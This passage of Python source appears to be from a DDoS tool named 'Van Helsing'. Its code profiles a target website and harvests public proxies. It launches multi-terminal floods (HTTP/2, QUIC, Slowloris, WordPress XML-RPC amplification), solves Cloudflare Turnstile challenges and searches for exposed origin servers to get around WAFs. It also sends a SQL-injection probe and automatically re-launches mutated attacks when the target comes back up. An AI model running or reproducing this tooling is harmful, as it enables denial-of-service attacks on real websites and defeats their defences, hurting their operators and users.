                r = requests.get(url, timeout=8, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"}, verify=False, allow_redirects=True)
                server_info = r.headers.get("server", "Unknown")
                if r.headers.get("cf-ray") or "cloudflare" in server_info.lower():
                    is_hardened = True
                    target_profile['waf'] = 'Cloudflare'
                target_profile['server'] = server_info
                print(f"  {bcolors.OKGREEN}[+] Server: {server_info} | Status: {r.status_code}{bcolors.RESET}")
            except Exception as e2:
                print(f"  {bcolors.WARNING}[!] Recon failed: {e2} — using max aggression{bcolors.RESET}")
        
        # --- STEP 2: AUTO PROXY HARVEST ---
        print(f"\n{bcolors.OKCYAN}{'='*60}{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}  [STEP 2/4] AUTO PROXY HARVEST{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}{'='*60}{bcolors.RESET}")
        
        proxy_mode = "3" if is_indo else "1"
        ProxyManager.download_proxies(proxy_mode)
        
        # --- STEP 3: INTELLIGENT TERMINAL STRATEGY ---
        print(f"\n{bcolors.OKCYAN}{'='*60}{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}  [STEP 3/4] COMPUTING ATTACK STRATEGY{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}{'='*60}{bcolors.RESET}")
        
        # Use TargetProfiler recommended methods to build terminal configs
        rec_methods = target_profile.get('methods', ['CHAOS', 'STRESS', 'GET'])
        supports_h3 = 'h3' in target_profile.get('alt_svc', '').lower()
        open_ports = target_profile.get('open_ports', [])
        
        if is_hardened and supports_h3:
            # WAF + HTTP/3 support: 4 terminals with QUIC spearhead
            num_terminals = 4
            m3 = rec_methods[0] if rec_methods else "DYN"
            m4 = rec_methods[1] if len(rec_methods) > 1 else "SLOW"
            terminal_configs = [
                ("CHAOS",    "200", "5", "proxy.txt"),
                ("H3_QUIC",  "150", "5", "proxy.txt"),  # QUIC spearhead
                (m3,         "100", "3", "proxy.txt"),
                (m4,         "80",  "1", "proxy.txt"),
            ]
            print(f"  {bcolors.OKRED}[STRATEGY] WAF+H3 ({target_profile['waf']}) → 4 Terminals (CHAOS + H3_QUIC + {m3} + {m4}){bcolors.RESET}")
        elif is_hardened:
            # WAF-protected: 3 terminals, profiler-recommended methods
            num_terminals = 3
            m1, m2, m3 = "CHAOS", rec_methods[0] if rec_methods else "DYN", rec_methods[1] if len(rec_methods) > 1 else "SLOW"
            terminal_configs = [
                (m1, "200", "5", "proxy.txt"),
                (m2, "150", "3", "proxy.txt"),
                (m3, "100", "1", "proxy.txt"),
            ]
            print(f"  {bcolors.OKRED}[STRATEGY] WAF TARGET ({target_profile['waf']}) → 3 Terminals ({m1} + {m2} + {m3}){bcolors.RESET}")
        elif target_profile.get('cms') == 'WordPress':
            # WordPress: exploit XMLRPC + WP_SEARCH
            num_terminals = 3
            terminal_configs = [
                ("CHAOS",      "200", "5", "proxy.txt"),
                ("XMLRPC_AMP", "150", "5", "proxy.txt"),
                ("WP_SEARCH",  "100", "3", "proxy.txt"),
            ]
            print(f"  {bcolors.OKRED}[STRATEGY] WORDPRESS → 3 Terminals (CHAOS + XMLRPC_AMP + WP_SEARCH){bcolors.RESET}")
        elif target_profile['server'] == 'apache':
            # Apache: Slowloris is devastating
            num_terminals = 2
            terminal_configs = [
                ("CHAOS", "200", "5", "proxy.txt"),
                ("SLOW",  "150", "1", "proxy.txt"),
            ]
            print(f"  {bcolors.WARNING}[STRATEGY] APACHE → 2 Terminals (CHAOS + SLOW){bcolors.RESET}")
        elif is_indo:
            num_terminals = 2
            m2 = rec_methods[0] if rec_methods else "POST_DYN"
            terminal_configs = [
                ("CHAOS", "200", "5", "proxy.txt"),
                (m2,      "150", "5", "proxy.txt"),
            ]
            print(f"  {bcolors.WARNING}[STRATEGY] INDO TARGET → 2 Terminals (CHAOS + {m2}){bcolors.RESET}")
        else:
            # Standard target
            num_terminals = 2
            m2 = rec_methods[0] if rec_methods else "STRESS"
            terminal_configs = [
                ("CHAOS", "200", "5", "proxy.txt"),
                (m2,      "150", "5", "proxy.txt"),
            ]
            print(f"  {bcolors.OKCYAN}[STRATEGY] STANDARD ({target_profile['server']}) → 2 Terminals (CHAOS + {m2}){bcolors.RESET}")
        
        # [V36] If open alternative ports found, add a dedicated port-attack terminal
        if open_ports:
            port = open_ports[0]
            print(f"  {bcolors.WARNING}[+] Adding Port {port} attack terminal (bypasses front-facing WAF){bcolors.RESET}")
            num_terminals += 1
            # Construct URL targeting the alt port directly
            terminal_configs.append(("H2_FLOOD", "100", "3", "proxy.txt"))
        
        # --- STEP 3b: SMART PROXY PARTITION (Round-Robin) ---
        try:
            with open("proxy.txt", "r") as f:
                all_proxies = [l.strip() for l in f if l.strip()]
            
            if len(all_proxies) > 0:
                # Smart partition: distribute evenly using round-robin
                # proxy.txt has verified alive at TOP, so round-robin ensures
                # each terminal gets equal share of alive + unchecked proxies
                terminal_pools = [[] for _ in range(num_terminals)]
                for idx, proxy in enumerate(all_proxies):
                    terminal_pools[idx % num_terminals].append(proxy)
                
                for i in range(num_terminals):
                    partition_file = f"proxy_legion_{i+1}.txt"
                    with open(partition_file, "w", encoding="utf-8") as pf:
                        pf.write("\n".join(terminal_pools[i]))
                    terminal_configs[i] = (
                        terminal_configs[i][0],
                        terminal_configs[i][1],
                        terminal_configs[i][2],
                        partition_file
                    )
                    print(f"  {bcolors.OKGREEN}[PARTITION] Terminal {i+1}: {len(terminal_pools[i]):,} proxies → {partition_file} (round-robin){bcolors.RESET}")
            else:
                print(f"  {bcolors.WARNING}[!] No proxies loaded — running single terminal direct{bcolors.RESET}")
                num_terminals = 1
                terminal_configs = [("CHAOS", "100", "5", "proxy.txt")]
        except Exception as e:
            print(f"  {bcolors.FAIL}[!] Partition error: {e} — using single proxy file{bcolors.RESET}")
        
        # --- STEP 4: LAUNCH ALL TERMINALS ---
        print(f"\n{bcolors.OKRED}{'='*60}{bcolors.RESET}")
        print(f"{bcolors.OKRED}  [STEP 4/4] LAUNCHING {num_terminals} ATTACK TERMINAL(S){bcolors.RESET}")
        print(f"{bcolors.OKRED}{'='*60}{bcolors.RESET}")
        print(f"  Target    : {bcolors.OKBLUE}{target}{bcolors.RESET}")
        print(f"  Duration  : {bcolors.OKBLUE}{duration}s{bcolors.RESET}")
        print(f"  Terminals : {bcolors.OKBLUE}{num_terminals}{bcolors.RESET}")
        for i, (m, t, r, pf) in enumerate(terminal_configs):
            print(f"  Terminal {i+1}: {bcolors.OKRED}{m}{bcolors.RESET} | {t} threads | RPC {r} | {pf}")
        print(f"{bcolors.OKRED}{'='*60}{bcolors.RESET}")
        print()
        
        processes = []
        
        # [V36] Spawn Background Turnstile Daemon if Cloudflare detected
        if target_profile.get('waf') in ['Cloudflare']:
            print(f"  {bcolors.WARNING}[+] Enlisting Turnstile Daemon for CF Clearance auto-renewal...{bcolors.RESET}")
            daemon_cmd = [sys.executable, "turnstile_dispenser.py", url, "--daemon"]
            if os.name == 'nt':
                # Windows hidden process attempt
                daemon_proc = subprocess.Popen(daemon_cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                daemon_proc = subprocess.Popen(daemon_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            processes.append(daemon_proc)
        
        for i, (method, threads, rpc, proxy_file) in enumerate(terminal_configs):
            cmd = [
                sys.executable, "start.py",
                method, target, "5", threads, proxy_file, rpc, duration
            ]
            
            if num_terminals > 1 and os.name == 'nt':
                # Windows: open new cmd window for each terminal
                title = f"CHAOS Terminal {i+1} - {method}"
                full_cmd = f'start "{title}" {sys.executable} start.py {method} {target} 5 {threads} {proxy_file} {rpc} {duration}'
                os.system(full_cmd)
                print(f"  {bcolors.OKGREEN}[+] Terminal {i+1} ({method}) LAUNCHED in new window{bcolors.RESET}")
            elif num_terminals > 1:
                # Linux: background process
                proc = subprocess.Popen(cmd)
                processes.append(proc)
                print(f"  {bcolors.OKGREEN}[+] Terminal {i+1} ({method}) LAUNCHED (PID: {proc.pid}){bcolors.RESET}")
            else:
                # Single terminal: run in current window
                print(f"  {bcolors.OKGREEN}[+] Launching {method} in current terminal...{bcolors.RESET}")
                try:
                    subprocess.run(cmd)
                except KeyboardInterrupt:
                    print(f"\n{bcolors.WARNING}[!] Attack interrupted by user.{bcolors.RESET}")
        
        if processes:
            print(f"\n{bcolors.WARNING}[*] All terminals running. Sentinel is watching. Press Ctrl+C to stop.{bcolors.RESET}")
            try:
                # [V36] Sentinel Auto-Escalation with Smart Mutation
                consecutive_up = 0
                mutation_gen = 0
                MUTATION_POOL = ["H3_QUIC", "STRESS", "POST_DYN", "SLOW_V2", "H2_FLOOD", "DYN", "CHAOS"]
                import time
                
                while any(p.poll() is None for p in processes):
                    time.sleep(10)
                    try:
                        r = requests.get(url, timeout=5, verify=False, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0'
                        })
                        if r.status_code < 400:
                            consecutive_up += 1
                            print(f"\r  {bcolors.WARNING}[SENTINEL] Target UP ({r.status_code}) | Streak: {consecutive_up}/3{bcolors.RESET}  ", end="")
                            
                            if consecutive_up >= 3:
                                mutation_gen += 1
                                print(f"\n  {bcolors.FAIL}[SENTINEL] Target recovered! Executing Mutation Gen-{mutation_gen}...{bcolors.RESET}")
                                
                                # Kill only attack processes (not daemon)
                                for p in processes:
                                    try: p.terminate()
                                    except: pass
                                time.sleep(2)
                                
                                # Pick 2 mutated methods from pool (cycle based on generation)
                                idx = (mutation_gen * 2) % len(MUTATION_POOL)
                                m1 = MUTATION_POOL[idx]
                                m2 = MUTATION_POOL[(idx + 1) % len(MUTATION_POOL)]
                                
                                print(f"  {bcolors.WARNING}[SENTINEL] Mutation → {m1} + {m2} (Gen-{mutation_gen}){bcolors.RESET}")
                                
                                # Re-launch with mutated methods
                                processes = []
                                for i, (method, threads) in enumerate([(m1, "200"), (m2, "150")]):
                                    cmd = [sys.executable, "start.py", method, target, "5", threads, "proxy.txt", "5", duration]
                                    if os.name == 'nt':
                                        title = f"MUTANT Gen-{mutation_gen} T{i+1} - {method}"
                                        full_cmd = f'start "{title}" {" ".join(cmd)}'
                                        os.system(full_cmd)
                                    else:
                                        proc = subprocess.Popen(cmd)
                                        processes.append(proc)
                                    print(f"  {bcolors.OKGREEN}[+] Mutant Terminal {i+1} ({method}) LAUNCHED{bcolors.RESET}")
                                
                                consecutive_up = 0
                        else:
                            consecutive_up = 0
                    except Exception:
                        consecutive_up = 0
                        
            except KeyboardInterrupt:
                print(f"\n{bcolors.FAIL}[!] Terminating all terminals...{bcolors.RESET}")
                for p in processes:
                    try: p.terminate()
                    except: pass
        
        return
    
    # ================================================================
    # OPTIONS 2-7: LEGACY MANUAL FLOW
    # ================================================================
    methods = {"2": "SLOW", "3": "DYN", "4": "STRESS", "5": "XMLRPC", "6": "POST_DYN", "7": "H2_FLOOD"}
    method = methods.get(choice, "CHAOS")

    clear()
    banner()
    print(f"{bcolors.HEADER}[ TARGET CONFIGURATION ]{bcolors.RESET}")
    url = input(f"Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    origin_ip = input(f"Origin IP (Optional, press Enter to skip): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if origin_ip:
        target = f"{url}@{origin_ip}"
    else:
        target = url

    clear()
    banner()
    print(f"{bcolors.HEADER}[ PROXY CONFIGURATION ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Proxy (Auto-Scavenge/Download)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Private Proxy (From your own file)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] Indonesian Scavenger (Auto-find Indo Proxies)")
    
    proxy_choice = input(f"{bcolors.BOLD}Choose Proxy Type (1-3): {bcolors.RESET}")
    
    if proxy_choice == "2":
        proxy_file = input(f"Enter proxy filename (e.g. proxy.txt): {bcolors.OKBLUE}").strip()
        proxy_type = "5"
        print(f"{bcolors.RESET}", end="")
    elif proxy_choice == "3":
        proxy_file = "proxy.txt"
        proxy_type = "7" 
    else:
        proxy_file = "proxy.txt"
        proxy_type = "5"
        # Auto-download proxies for option 1
        ProxyManager.download_proxies("1")

    clear()
    banner()
    print(f"{bcolors.HEADER}[ INTENSITY CONFIGURATION ]{bcolors.RESET}")
    
    threads = input(f"Threads (Recommended: 100-500, current best: 100): {bcolors.OKBLUE}").strip() or "100"
    print(f"{bcolors.RESET}", end="")
    
    rpc = input(f"RPC (Requests Per Connection, Default: 5): {bcolors.OKBLUE}").strip() or "5"
    print(f"{bcolors.RESET}", end="")
    
    duration = input(f"Duration in Seconds (e.g. 800): {bcolors.OKBLUE}").strip() or "800"
    print(f"{bcolors.RESET}", end="")

    cmd = [
        sys.executable, "start.py",
        method, target, proxy_type, threads, proxy_file, rpc, duration
    ]

    clear()
    banner()
    print(f"{bcolors.OKGREEN}CONFIGURATION COMPLETE!{bcolors.RESET}")
    print(f"Method   : {bcolors.OKBLUE}{method}{bcolors.RESET}")
    print(f"Target   : {bcolors.OKBLUE}{target}{bcolors.RESET}")
    print(f"Threads  : {bcolors.OKBLUE}{threads}{bcolors.RESET}")
    print(f"Duration : {bcolors.OKBLUE}{duration}s{bcolors.RESET}")
    print("-" * 30)
    print(f"{bcolors.BOLD}Launching Attack...{bcolors.RESET}")
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")

# ----------------- ASYNC RECON TOOLS -----------------
async def scan_port(sem, target, port):
    async with sem:
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=2.0)
            writer.close()
            await writer.wait_closed()
            return port
        except:
            return None

async def run_port_scan(target_domain, ports):
    sem = asyncio.Semaphore(100)
    tasks = [scan_port(sem, target_domain, p) for p in ports]
    results = await asyncio.gather(*tasks)
    return [p for p in results if p]

_waf_asn_cache = {}

async def check_subdomain_async(sem, sub_domain, target_domain, resolved_ip, main_sig, session):
    async with sem:
        try:
            loop = asyncio.get_event_loop()
            sub_ip = await loop.run_in_executor(None, socket.gethostbyname, sub_domain)
            if sub_ip == resolved_ip: return None # Skip same IP to avoid false positives entirely
            
            is_candidate = False
            match_status = f"{bcolors.WARNING}UNVERIFIED{bcolors.RESET}"
            
            # WAF IP Verification Check via ip-api
            waf_detected = False
            if sub_ip not in _waf_asn_cache:
                try:
                    async with session.get(f"http://ip-api.com/json/{sub_ip}?fields=isp,as", timeout=3) as rip:
                        if rip.status == 200:
                            data = await rip.json()
                            isp_info = (data.get("isp", "") + " " + data.get("as", "")).lower()
                            if any(waf in isp_info for waf in ["cloudflare", "akamai", "fastly", "imperva", "sucuri"]):
                                _waf_asn_cache[sub_ip] = True
                            else:
                                _waf_asn_cache[sub_ip] = False
                except Exception:
                    _waf_asn_cache[sub_ip] = False
            
            waf_detected = _waf_asn_cache.get(sub_ip, False)

            if waf_detected:
                match_status = f"{bcolors.WARNING}CDN/WAF IP (Not Origin){bcolors.RESET}"
            else:
                try:
                    async with session.get(f"http://{sub_domain}", timeout=3, ssl=False) as r_check:
                        content = await r_check.read()
                        check_sig = len(content)
                        if main_sig > 0:
                            ratio = abs(main_sig - check_sig) / main_sig
                            if ratio < 0.2:
                                match_status = f"{bcolors.FAIL}CONFIRMED EXPOSED ORIGIN!{bcolors.RESET}"
                                is_candidate = True
                            else:
                                match_status = f"{bcolors.OKCYAN}Content Mismatch{bcolors.RESET}"
                        else:
                            is_candidate = True # Assumed origin if main sig is 0
                except Exception:
                    match_status = "Dead/Timeout"
            
            return (sub_domain, sub_ip, match_status, is_candidate)
        except Exception:
            return None

async def run_zone_hunter(scan_list, target_domain, resolved_ip, main_sig):
    sem = asyncio.Semaphore(50)
    results = []
    exposed_origin = None
    
    print(f"[*] Scanning {len(scan_list)} subdomains via AsyncIO...")
    connector = aiohttp.TCPConnector(verify_ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(check_subdomain_async(sem, sub, target_domain, resolved_ip, main_sig, session)) for sub in scan_list]
        completed = 0
        total = len(scan_list)
        for f in asyncio.as_completed(tasks):
            completed += 1
            print(f"[*] Scanning Progress: [{completed}/{total}] ...{' '*20}", end="\r")
            try:
                res = await f
                if res:
                    sub_domain, sub_ip, match_status, is_candidate = res
                    print(f"{' '*60}", end="\r") 
                    print(f"[*] Found {sub_domain:<30} : {sub_ip} | {match_status}")
                    if is_candidate and not exposed_origin:
                        exposed_origin = sub_domain
            except Exception as e:
                pass
    return exposed_origin


def run_intel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER PRO ]{bcolors.RESET}")
    target = input(f"Enter Target Domain (e.g. example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if "://" in target:
        target_domain = target.split("://")[1].split("/")[0]
        target_url = target
    else:
        target_domain = target.split("/")[0]
        target_url = f"https://{target}"

    common_subs = ["origin", "direct", "cpanel", "mail", "dev", "test", "api", "ftp", "beta", "admin", "secure", "www1", "web"]
    print("-" * 40)
    
    use_proxy = False
    print(f"{bcolors.WARNING}[?] Enable Stealth Mode (Use Proxies for Scan)? (y/n): {bcolors.RESET}", end="")
    ans = input().lower()
    if ans.startswith("y"):
        use_proxy, proxy_list = ProxyManager.prompt_and_download(target, True)

    print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
    resolved_ip = None
    try:
        resolved_ip = socket.gethostbyname(target_domain)
        print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
    except socket.gaierror as e:
        print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")
        return

    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner (Async)...{bcolors.RESET}")
    interesting_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 8880]
    
    open_ports = asyncio.run(run_port_scan(target_domain, interesting_ports))
    if open_ports:
        for p in open_ports:
             print(f"[*] Port {p:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
    else:
        print(f"[*] Ports      : {bcolors.WARNING}No common opened ports found{bcolors.RESET}")

    print(f"\n{bcolors.OKCYAN}Phase 3: CMS & Vulnerability Hunter...{bcolors.RESET}")
    cms_detected = "Unknown"
    vuln_vector = None
    server_header = "Unknown"
    cdn_guess = "Unknown"
    pass_clearance_to_start = False
    
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'}
    
    def get_req_kwargs():
        kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
        if use_proxy and proxy_list:
            p = random.choice(proxy_list)
            if "://" not in p: p = f"http://{p}"
            kwargs['proxies'] = {'http': p, 'https': p}
        return kwargs

    def get_robust_response(url, retries=3):
        for i in range(retries):
            try:
                kwargs = get_req_kwargs()
                if i > 0: print(f"{bcolors.WARNING}[-] Connection Failed. Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
                r = requests.get(url, **kwargs)
                if i > 0: print(f"{' '*80}", end="\r")
                return r
            except Exception as e:
                if i == retries - 1: raise e
        raise Exception("Max retries")
        
    try:
        r = get_robust_response(target_url)
        server_header = r.headers.get('Server', 'Unknown')
        powered_by = r.headers.get('X-Powered-By', 'Unknown')
        print(f"[*] Server       : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")

        headers_str = str(r.headers).lower()
        wafs = {"cloudflare": "Cloudflare", "akamai": "Akamai", "fastly": "Fastly", "imperva": "Imperva", "sucuri": "Sucuri"}
        for key, name in wafs.items():
            if key in headers_str:
                cdn_guess = name
                break
        if cdn_guess != "Unknown":
            print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")

        print("[*] Checking for WordPress XML-RPC...", end="\r")
        try:
            r_xml = get_robust_response(f"{target_url}/xmlrpc.php", retries=2)
            if r_xml.status_code == 405 or "XML-RPC server accepts" in r_xml.text:
                print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
                cms_detected = "WordPress"
                vuln_vector = "XMLRPC"
            else:
                 print(f"[*] XML-RPC      : Safe/Not Found           ")
        except:
             print(f"[*] XML-RPC      : Error Checking           ")
        
        try:
            cookies_str = str(r.cookies.get_dict()).lower()
            if "phpsessid" in cookies_str:
                print(f"[*] Technology   : {bcolors.WARNING}PHP Detected{bcolors.RESET}")
                if "Apache" in server_header: vuln_vector = "SLOW_POST"
            elif "asp.net" in cookies_str or "asp.net" in powered_by.lower():
                print(f"[*] Technology   : {bcolors.WARNING}ASP.NET{bcolors.RESET}")
        except: pass

        print("[*] Probing WAF Sensitivity...", end="\r")
        try:
            if r.status_code in [403, 503] and ("cloudflare" in headers_str or "turnstile" in r.text.lower() or "challenge" in r.text.lower()):
                 print(f"[*] WAF Status   : {bcolors.FAIL}Cloudflare JS Challenge/Turnstile Detected!{bcolors.RESET}")
                 print(f"[*] Mitigation   : {bcolors.WARNING}Auto-Launching Playwright Turnstile Dispenser...{bcolors.RESET}")
                 try:
                     from turnstile_dispenser import TurnstileDispenser
                     cf_clearance, cf_ua = TurnstileDispenser.solve_challenge(target_url)
                     if cf_clearance:
                         print(f"[*] Dispenser    : {bcolors.OKGREEN}Clearance Secured! Writing to files/cf_clearance.txt{bcolors.RESET}")
                         os.makedirs('files', exist_ok=True)
                         with open("files/cf_clearance.txt", "w") as cf_file:
                             cf_file.write(cf_clearance)
                         pass_clearance_to_start = True
                     else:
                         print(f"[*] Dispenser    : {bcolors.FAIL}Failed to break Turnstile.{bcolors.RESET}")
                 except Exception as err:
                     print(f"[*] Dispenser    : {bcolors.FAIL}Execution failed: {err}{bcolors.RESET}")
            else:
                r_waf = get_robust_response(f"{target_url}?search=' OR 1=1", retries=1)
                if r_waf.status_code in [403, 406, 501]:
                    print(f"[*] WAF Status   : {bcolors.OKGREEN}ACTIVE & SENSITIVE (Blocking SQLi){bcolors.RESET}   ")
                elif r_waf.status_code == 200:
                    print(f"[*] WAF Status   : {bcolors.FAIL}PASSIVE/BYPASSED (Payload Accepted){bcolors.RESET}   ")
                else: 
                     print(f"[*] WAF Status   : Unknown ({r_waf.status_code})           ")
        except Exception as e:
            print(f"[*] WAF Status   : Error Probe: {e}   ")
             
    except Exception as e:
        print(f"{bcolors.FAIL}[!] Phase 3 Error: {e}{bcolors.RESET}")


    print(f"\n{bcolors.OKCYAN}Phase 4: CRT.SH Certificate Search...{bcolors.RESET}")
    try:
        r_crt = get_robust_response(f"https://crt.sh/?q=%.{target_domain}&output=json", retries=2)
        if r_crt.status_code == 200:
            try:
                crt_subs = set()
                for entry in r_crt.json():
                    name = entry.get('name_value', '')
                    for p in name.split("\\n"):
                        if target_domain in p and "*" not in p:
                            crt_subs.add(p)
                if crt_subs:
                    print(f"[*] CRT.SH Found  : {bcolors.OKGREEN}{len(crt_subs)} subdomains{bcolors.RESET}")
                    for sub in crt_subs:
                        clean = sub.replace(f".{target_domain}", "")
                        common_subs.append(clean)
                else:
                    print("[*] CRT.SH        : No new subdomains found.")
            except Exception as e:
                print(f"[*] CRT.SH        : JSON Parse Error {e}")
        else:
            print(f"[*] CRT.SH        : Failed ({r_crt.status_code})")
    except Exception as e:
        print(f"[*] CRT.SH Error  : {e}")

    print(f"\n{bcolors.OKCYAN}Phase 5: Zone Hunter & Content Verification (Async)...{bcolors.RESET}")
    scan_list = [f"{s}.{target_domain}" if target_domain not in s else s for s in list(set(common_subs))]
    
    main_sig = 0
    try:
        main_sig = len(requests.get(target_url, timeout=5, verify=False).content)
        print(f"[*] Main Site Size : {main_sig} bytes")
    except Exception as e:
         print(f"[*] Main Site Size : Failed ({e})")

    exposed_origin = asyncio.run(run_zone_hunter(scan_list, target_domain, resolved_ip, main_sig))

    print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
    rec_method, reason = "H2_FLOOD", "Standard High-Throughput HTTP/2 Attack"

    if vuln_vector == "XMLRPC":
        rec_method, reason = "XMLRPC", "CRITICAL: XML-RPC Amplification detected! Most damage per request."
        args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
    elif exposed_origin:
        rec_method, reason = "H2_FLOOD (Origin Bypass)", f"EXPOSED ORIGIN FOUND! Attack {exposed_origin} to bypass {cdn_guess}."
        target_url = f"https://{exposed_origin}"
        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
    elif "Apache" in server_header and cdn_guess == "Unknown":
        rec_method, reason = "SLOW", "Apache Target without WAF is vulnerable to Slowloris."
        args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
    elif 2083 in open_ports or 2087 in open_ports:
        rec_method, reason = "H2_FLOOD (Backend)", "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
        target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
    else:
        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]

    if pass_clearance_to_start:
        reason += " [Clearance Ready]"

    cmd_string = f"{sys.executable} start.py {' '.join(args)}"
    print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
    print(f"Reason : {reason}")
    print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
    
    print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
    if input().lower().startswith("y"):
        cmd = [sys.executable, "start.py"] + args
        try:
            subprocess.run(cmd)
        except Exception as e:
            print(f"Error: {e}")

    print(f"\n{bcolors.OKCYAN}[?] Save Intel Report to 'intel_report.txt'? (y/n): {bcolors.RESET}", end="")
    if input().lower().startswith("y"):
        try:
            with open("intel_report.txt", "a") as f:
                f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Target: {target_url}\n")
                f.write(f"   IP: {resolved_ip}\n   Server: {server_header}\n")
                if cdn_guess != "Unknown": f.write(f"   WAF: {cdn_guess}\n")
                if open_ports: f.write(f"   Open Ports: {open_ports}\n")
                if exposed_origin: f.write(f"   Exposed Origin: {exposed_origin}\n")
                if vuln_vector: f.write(f"   Vulnerability: {vuln_vector}\n")
                f.write(f"   Recommended: {rec_method}\n")
                f.write("-" * 40 + "\n")
            print(f"{bcolors.OKGREEN}[+] Report Saved!{bcolors.RESET}")
        except Exception as e:
            print(f"{bcolors.FAIL}[!] Failed to save report: {e}{bcolors.RESET}")

    print("\nPress Enter to return to menu...")
    input()
    main()

def run_sentinel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ SENTINEL - LIVE TARGET MONITOR ]{bcolors.RESET}")
    target = input(f"Enter Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if not target.startswith("http"): target = "https://" + target
        
    print(f"\n{bcolors.WARNING}[?] Use Proxies for Monitoring? (y/n): {bcolors.RESET}", end="")
    use_proxy = False
    proxy_list = []
    if input().lower().startswith("y"):
        use_proxy, proxy_list = ProxyManager.prompt_and_download(target, True)

    print(f"\n{bcolors.BOLD}[*] Monitoring {target}... (Ctrl+C to stop){bcolors.RESET}")
    print("-" * 50)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        while True:
            timestamp = time.strftime('%H:%M:%S')
            try:
                req_kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
                if use_proxy and proxy_list:
                     p = random.choice(proxy_list)
                     if "://" not in p: p = f"http://{p}"
                     req_kwargs['proxies'] = {'http': p, 'https': p}

                start_time = time.time()
                r = requests.get(target, **req_kwargs)
                latency = int((time.time() - start_time) * 1000)
                
                status_color = bcolors.OKGREEN if r.status_code < 400 else bcolors.WARNING if r.status_code < 500 else bcolors.FAIL
                print(f"[{timestamp}] Status: {status_color}{r.status_code}{bcolors.RESET} | Time: {latency}ms")
                
            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                 msg = "TIMEOUT/PROXY LAG" if use_proxy else "TIMEOUT"
                 print(f"[{timestamp}] Status: {bcolors.WARNING}{msg}{bcolors.RESET} | Retrying...")
            except requests.exceptions.ConnectionError:
                 msg = "CONN FAIL" if use_proxy else "DOWN"
                 print(f"[{timestamp}] Status: {bcolors.FAIL}{msg}{bcolors.RESET}    | Unreachable")
            except Exception as e:
                print(f"[{timestamp}] Status: {bcolors.FAIL}ERROR{bcolors.RESET}   | {e}")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Sentinel Stopped.{bcolors.RESET}")
        time.sleep(1)
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Exiting Van Helsing...{bcolors.RESET}")
        sys.exit(0)
